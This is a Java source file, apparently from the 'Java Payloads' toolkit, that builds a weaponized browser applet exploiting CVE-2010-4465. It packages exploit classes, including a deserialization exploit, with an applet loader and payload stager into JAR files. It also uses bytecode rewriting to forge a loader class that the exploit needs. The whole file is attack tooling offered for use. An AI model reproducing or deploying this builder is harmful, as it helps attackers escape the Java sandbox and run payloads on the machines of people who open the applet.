/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.InputStream;
import java.util.jar.Manifest;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodAdapter;
import org.objectweb.asm.MethodVisitor;

public class CVE_2010_4465_AppletJarBuilder extends Builder {
	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("Usage: java javapayload.builder.CVE_2010_4465_AppletJarBuilder "+JarBuilder.ARGS_SYNTAX);
			return;
		}
		new CVE_2010_4465_AppletJarBuilder().build(args);
	}

	private CVE_2010_4465_AppletJarBuilder() {
		super("Build an applet that exploits CVE-2010-4465", "Use the source, Luke!");
	}
	
	public String getParameterSyntax() {
		return JarBuilder.ARGS_SYNTAX;
	}
	
	public void build(String[] args) throws Exception {
		final Class[] baseClasses = new Class[] {
				javapayload.exploit.CVE_2010_4465.class,
				javapayload.exploit.CVE_2010_4465.MyDropTarget.class,
				javapayload.exploit.CVE_2010_4465.MyTransferHandler.class,
				javapayload.exploit.CVE_2010_4465.MyJTextField.class,
				javapayload.exploit.DeserializationExploit.class,
				javapayload.exploit.DeserializationExploit.Loader.class,
				javapayload.loader.AppletLoader.class,
				javapayload.loader.AppletLoader.ReadyNotifier.class,
				javapayload.stager.Stager.class,
		};
		JarBuilder.buildJarFromArgs(args, "CVE_2010_4465_Applet", baseClasses, new Manifest(), null, null);

		// I could have compiled that class separately (as it must have the same name), 
		// but since it is that simple, I will create it using ASM.
		final ClassWriter cw = new ClassWriter(0);
		final ClassVisitor stagerVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(version, access, name, signature, "java/lang/Object", interfaces);
			}
			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				if (name.equals("<init>"))
					return new MethodAdapter(super.visitMethod(access, name, desc, signature, exceptions)) {
						public void visitMethodInsn(int opcode, String owner, String name, String desc) {
							super.visitMethodInsn(opcode, "java/lang/Object", name, desc);
						}
					};
				else
					return null;
			}
		};
		Class originalClass = javapayload.exploit.CVE_2010_4465_Loader.class;
		final InputStream is = originalClass.getResourceAsStream("/" + originalClass.getName().replace('.', '/') + ".class");
		new ClassReader(is).accept(stagerVisitor, ClassReader.SKIP_DEBUG);
		is.close();
		JarBuilder.buildJar("1.jar", new Class[0], false, new Manifest(), originalClass.getName().replace('.', '/') + ".class", cw.toByteArray());
		JarBuilder.buildJar("2.jar", new Class[] {originalClass}, false, new Manifest(), null, null);
	}
}
